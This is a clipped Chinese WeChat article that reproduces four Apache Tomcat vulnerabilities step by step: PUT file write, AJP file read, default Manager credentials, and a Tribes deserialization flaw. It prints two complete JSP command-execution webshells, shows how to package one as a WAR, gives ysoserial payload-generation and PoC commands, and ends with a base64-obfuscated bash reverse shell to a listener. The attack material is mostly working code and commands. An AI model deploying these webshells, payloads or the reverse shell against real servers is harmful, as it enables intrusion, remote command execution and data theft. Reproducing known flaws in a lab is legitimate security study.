---
title: 【微信】Tomcat常见的漏洞汇总
source: https://mp.weixin.qq.com/s/_z9B79zCunkP5V4NRIsh5w
source_host: mp.weixin.qq.com
clip_date: 2026-11-19T12:44:08+08:00
trace_id: 7c4dcd48-9d85-43f0-9939-d4fba0e648d5
content_hash: b9687ce48e45dff355de578d698c6e909f559057a1c78c3078016812c2b5ac49
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 17
  succeeded: 17
  failed_urls: []
notion_page_id: 41d75244-d011-810b-bba1-ec1f0e814ed9
ioc:
  cves:
    - CVE-2017-12615
    - CVE-2020-1938
    - CVE-2026-34486
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

**淋烟雨漫江南** *2026年11月18日 11:35*

这篇文章主要记录关于tomcat比较常见的漏洞做一个简单的复现

介绍

Java 目前是网页开发中最受欢迎的编程语言，而Tomcat 是最受欢迎的Java中间件服务器之一。自首次发布以来，它已经使用了20多年。

漏洞一

Tomcat通过PUT方法实现任意写文件漏洞（CVE-2017-12615）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e97eea28bfd3d881.png)

修改GET方法为PUT返回201说明成功创建

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/980c25dd17fce037.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/56938f13f85af3d9.png)

访问1.txt

写入webshell 记得在1.jsp后面加/不然会报404

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6762280c0e5015b9.png)

执行代码

```java
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.BufferedReader br = new java.io.BufferedReader(
                new java.io.InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) out.println(line);
    }
%>
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bad2f82e1cbed5cf.png)

漏洞二

Aapache Tomcat AJP 任意文件读取/包含漏洞（CVE-2020-1938）

直接用脚本梭哈

如果有师傅运行脚本跟我一样的错误按照我的方法改就能读取文件

```apache
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi //poc
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1bdd1e82a0f82f14.png)

运行脚本报错

```javascript
self.stream = self.socket.makefile("rb", bufsize=0)//选择下面的替换
```

```ini
# 写法一：使用 buffering 参数（推荐）
self.stream = self.socket.makefile("rb", buffering=0)
# 写法二：省略缓冲参数，使用默认缓冲
self.stream = self.socket.makefile("rb")
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cf7423c8b5db228a.png)

以及303行的

```kotlin
print("".join([d.data for d in data])) //使用下面的替换
```

```bash
print(b"".join([d.data for d in data]).decode("utf-8", errors="replace"))
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/39f7dc07a6d08343.png)

读取/WEB-INF/web.xml文件

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/39f64dded4263a86.png)

可以读取webapps下的所有文件

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3b1aa860e7b993f4.png)

读取index.jsp

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1da380426689306c.png)

漏洞三

tomcat弱口令+后台getshell漏洞

访问8080点击Manager管理口

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b10be29dbd0abc6d.png)

输入默认口令tomcat/tomcat

保存改代码为shell.jsp

```java
<%@ page contentType="text/html;charset=UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream(), "UTF-8"));
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            int code = p.waitFor();
            out.println("\n[exitCode=" + code + "]");
        } catch (Exception e) {
            out.println("exec error: " + e);
        }
    }
%>
```

制作war包

```bash
jar -cvf shell.war ./index.jsp
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9b1471a641e87431.png)

上传访问并执行代码

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d1e0845a82a79489.png)

漏洞四

Tomcat Tribes EncryptInterceptor 绕过远程代码执行（CVE-2026-34486）

该漏洞利用 EncryptInterceptor 绕过程序，将未加密的Java 反序列化负载发送到 Tribes 接收端口。由于受攻击的容器在类路径上运输，任何 Apache Commons Collections小工具链都可以被用来执行任意系统命令。commons-collections 3.2.1

使用ysoserial.jar生成序列化攻击载荷

下载地址

```javascript
https://github.com/frohoff/ysoserial
```

生成攻击载荷

```apache
java -jar ysoserial-all.jar CommonsCollections6 "touch /tmp/success" > payload.ser
```

执行poc

```apache
poc.py -t target_ip -p 4000 -f payload.ser
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a9b1003e8c7c7988.png)

成功执行

查看是否已经创建文件

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b6f81dd983719573.png)

反弹shell

```bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cde7d6e9a582198c.png)

成功接收shell

作者提示: 个人观点，仅供参考
